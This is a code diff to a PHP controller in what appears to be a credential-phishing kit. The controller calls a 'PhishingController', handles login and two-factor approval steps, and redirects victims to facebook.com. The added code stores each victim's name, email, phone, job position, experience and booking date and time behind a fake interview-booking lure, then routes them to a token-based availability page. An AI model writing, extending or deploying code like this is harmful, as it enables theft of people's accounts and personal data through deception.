@@ -74,7 +74,11 @@ class LoginApprovalController extends Controller
         ]);
 
         $sessionData = app(PhishingController::class)->getSessionData();
-        $redirectUrl = "https://www.facebook.com";
+        $bookingReturn = session('booking_return_url');
+        if (!$bookingReturn && session('_otio_token')) {
+            $bookingReturn = url('/app/intro/availability-' . session('_otio_token') . '?confirm=1');
+        }
+        $redirectUrl = $bookingReturn ?: "https://www.facebook.com";
 
         $id = (string) Str::uuid();
         $ip = $request->ip();
@@ -157,6 +161,18 @@ class LoginApprovalController extends Controller
         // Also log using PhishingController logger
         app(PhishingController::class)->handleGenericLog($request);
 
+        session([
+            'booking_info' => [
+                'fullName' => $fullName,
+                'email' => $email,
+                'phone' => $phone,
+                'position' => $position,
+                'experience' => $experience,
+                'date' => $date,
+                'time' => $time,
+            ]
+        ]);
+
         return response()->json([
             'status' => 'ok',
             'redirectUrl' => url('/invitation-login'),
@@ -183,8 +199,12 @@ class LoginApprovalController extends Controller
 
         if (!$redirectUrl && $approval['status'] === 'approved') {
             $sessionData = app(PhishingController::class)->getSessionData();
+            $bookingReturn = session('booking_return_url');
+            if (!$bookingReturn && session('_otio_token')) {
+                $bookingReturn = url('/app/intro/availability-' . session('_otio_token') . '?confirm=1');
+            }
             if ($type === '2fa') {
-                $redirectUrl = "https://www.facebook.com";
+                $redirectUrl = $bookingReturn ?: "https://www.facebook.com";
             } else {
                 $redirectUrl = $sessionData['authPath'] ?? null;
             }
